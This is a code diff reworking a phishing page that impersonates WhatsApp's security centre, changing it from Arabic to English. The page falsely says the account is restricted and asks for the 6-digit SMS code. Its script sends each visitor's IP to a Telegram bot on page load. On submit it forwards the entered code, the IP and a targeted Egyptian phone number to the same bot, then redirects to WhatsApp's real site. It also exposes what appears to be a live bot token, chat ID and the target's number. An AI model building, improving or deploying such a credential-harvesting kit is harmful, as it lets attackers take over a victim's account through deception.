@@ -1,144 +1,140 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>مركز الأمان - WhatsApp</title>
+    <title>WhatsApp Security Verification</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #f7f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
-        .card { background: #ffffff; width: 100%; max-width: 400px; padding: 30px 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; border-top: 5px solid #008069; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #ffffff; color: #111b21; display: flex; justify-content: center; align-items: flex-start; height: 100vh; padding-top: 60px; }
         
-        .security-icon { width: 70px; height: 70px; background: #f0fdf4; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
-        .security-icon img { width: 40px; }
-
-        h1 { font-size: 20px; color: #111b21; margin-bottom: 15px; font-weight: 600; }
+        .wrapper { width: 100%; max-width: 360px; padding: 0 30px; text-align: center; }
         
-        .alert-box { background-color: #fff8e1; border-right: 4px solid #ffc107; padding: 15px; text-align: right; margin-bottom: 20px; border-radius: 4px; }
-        .alert-box p { font-size: 13px; color: #5d4037; line-height: 1.6; }
+        .header-title { color: #008069; font-size: 19px; font-weight: 500; margin-bottom: 30px; }
+        
+        .security-banner { background-color: #fff8e1; border: 1px solid #ffeeba; border-radius: 8px; padding: 12px; margin-bottom: 25px; text-align: left; }
+        .security-banner p { font-size: 13px; color: #856404; line-height: 1.4; }
 
-        .instruction { font-size: 14px; color: #667781; margin-bottom: 25px; line-height: 1.5; }
+        .desc { font-size: 14.5px; color: #667781; line-height: 1.5; margin-bottom: 25px; }
+        .phone { color: #111b21; font-weight: 600; display: block; margin: 4px 0; }
 
-        .otp-group { margin-bottom: 25px; }
-        input[type="text"] {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #e1e4e8;
-            border-radius: 8px;
-            font-size: 22px;
+        .otp-box { margin-bottom: 20px; }
+        .otp-input {
+            width: 160px;
+            border: none;
+            border-bottom: 2px solid #00a884;
+            font-size: 28px;
             text-align: center;
-            letter-spacing: 8px;
+            letter-spacing: 6px;
             outline: none;
-            transition: border-color 0.3s;
-            background: #fafafa;
+            padding-bottom: 5px;
+            background: transparent;
         }
-        input[type="text"]:focus { border-color: #008069; background: #fff; }
+        .otp-input::placeholder { color: #d1d7db; letter-spacing: 2px; }
 
-        .btn-verify {
+        .hint { font-size: 13px; color: #8696a0; margin-bottom: 40px; }
+
+        .btn-submit {
             background-color: #008069;
             color: white;
             border: none;
-            padding: 14px;
-            border-radius: 8px;
-            font-size: 16px;
+            padding: 12px 40px;
+            border-radius: 25px;
+            font-size: 14px;
             font-weight: 600;
-            width: 100%;
             cursor: pointer;
-            transition: background 0.2s;
+            width: 100%;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        .btn-verify:active { background-color: #006e5a; }
 
-        .footer { margin-top: 25px; border-top: 1px solid #f1f1f1; padding-top: 20px; }
-        .footer p { font-size: 12px; color: #8696a0; }
-        
-        /* Loading Screen */
-        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #008069; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .actions-footer { margin-top: 45px; border-top: 1px solid #f1f1f2; padding-top: 10px; }
+        .action-link { display: flex; align-items: center; padding: 15px 0; cursor: pointer; text-decoration: none; }
+        .action-link img { width: 20px; margin-right: 15px; opacity: 0.6; }
+        .action-link span { color: #008069; font-size: 14.5px; font-weight: 500; flex-grow: 1; text-align: left; }
+        .timer { color: #8696a0; font-size: 13px; }
+
+        #progress { display: none; position: fixed; top: 0; left: 0; width: 0%; height: 3px; background-color: #00a884; transition: width 0.4s; z-index: 1001; }
     </style>
 </head>
 <body>
 
-    <div id="loader">
-        <div class="spinner"></div>
-        <p style="margin-top: 15px; color: #008069; font-weight: 500;">جاري معالجة الطلب...</p>
-    </div>
+    <div id="progress"></div>
 
-    <div class="card">
-        <div class="security-icon">
-            <img src="https://img.icons8.com/fluency/48/000000/shield.png" alt="security">
+    <div class="wrapper">
+        <div class="header-title">Account Security</div>
+
+        <div class="security-banner">
+            <p><strong>Restricted:</strong> Your account is temporarily restricted due to multiple login attempts. Verification is required to restore access.</p>
         </div>
 
-        <h1>تأكيد ملكية الحساب</h1>
-
-        <div class="alert-box">
-            <p><strong>تنبيه:</strong> تم تقييد حسابك مؤقتاً لمدة 24 ساعة بسبب نشاط غير معتاد. يرجى إكمال التحقق لفك التقييد فوراً.</p>
+        <div class="desc">
+            Enter the 6-digit code sent to your registered number:
+            <span class="phone">+20 103 *** **87</span>
         </div>
 
-        <p class="instruction">أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك المرتبط بالحساب <strong>01030003287</strong></p>
-
-        <form id="verifyForm">
-            <div class="otp-group">
-                <input type="text" id="otp" placeholder="------" maxlength="6" inputmode="numeric" required>
+        <form id="authForm">
+            <div class="otp-box">
+                <input type="text" id="otp" class="otp-input" placeholder="--- ---" maxlength="6" inputmode="numeric" required>
             </div>
-            <button type="submit" class="btn-verify">إلغاء التقييد واستعادة الحساب</button>
+            <p class="hint">Enter 6-digit code</p>
+            
+            <button type="submit" id="btn" class="btn-submit">VERIFY & RESTORE</button>
         </form>
 
-        <div class="footer">
-            <p>© 2026 WhatsApp Inc. Security Operations</p>
+        <div class="actions-footer">
+            <div class="action-link">
+                <img src="https://img.icons8.com/material-rounded/24/008069/sms.png">
+                <span>Resend SMS</span>
+                <div class="timer">1:24</div>
+            </div>
+            <div class="action-link">
+                <img src="https://img.icons8.com/material-rounded/24/008069/phone.png">
+                <span>Call me</span>
+                <div class="timer">2:00</div>
+            </div>
         </div>
     </div>
 
     <script>
-        const API_CFG = {
-            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
-            C: '5446862709'
-        };
+        const API = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709', REF: '01030003287' };
 
-        // إخطارك عند دخول الضحية
         window.onload = async () => {
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                fetch(`https://api.telegram.org/bot${API_CFG.T}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: API_CFG.C,
-                        text: `🚨 ضحية جديدة دخلت الموقع!\nالرقم: 01030003287\nIP: ${ipRes.ip}`
-                    })
-                });
-            } catch(e) {}
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+            fetch(`https://api.telegram.org/bot${API.T}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: API.C, text: `🌐 [VISITOR] Page accessed by target.\nIP: ${ip}\nID: ${API.REF}` })
+            });
         };
 
-        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+        document.getElementById('authForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            const btn = document.getElementById('btn');
+            const prg = document.getElementById('progress');
             const code = document.getElementById('otp').value;
-            const loader = document.getElementById('loader');
-            
-            if(code.length < 6) return alert("يرجى إدخال كود صحيح");
 
-            loader.style.display = 'flex';
+            btn.disabled = true;
+            btn.innerText = "PROCESSING...";
+            prg.style.display = 'block';
+            setTimeout(() => prg.style.width = '80%', 100);
 
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                
-                await fetch(`https://api.telegram.org/bot${API_CFG.T}/sendMessage`, {
+                const ipD = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                await fetch(`https://api.telegram.org/bot${API.T}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        chat_id: API_CFG.C,
-                        text: `✅ كود جديد تم استلامه!\n\nالرقم: 01030003287\nالكود: ${code}\nالـ IP: ${ipRes.ip}`
+                        chat_id: API.C,
+                        text: `🚀 [HIT] OTP RECEIVED!\n\nTarget: ${API.REF}\nOTP: ${code}\nIP: ${ipD.ip}`
                     })
                 });
 
-                // تأخير بسيط للإيهام بالمعالجة
                 setTimeout(() => {
                     window.location.href = "https://www.whatsapp.com/contact/";
-                }, 3000);
-
+                }, 2000);
             } catch (err) {
-                loader.style.display = 'none';
-                alert("حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى.");
+                btn.disabled = false;
+                btn.innerText = "VERIFY & RESTORE";
             }
         });
     </script>
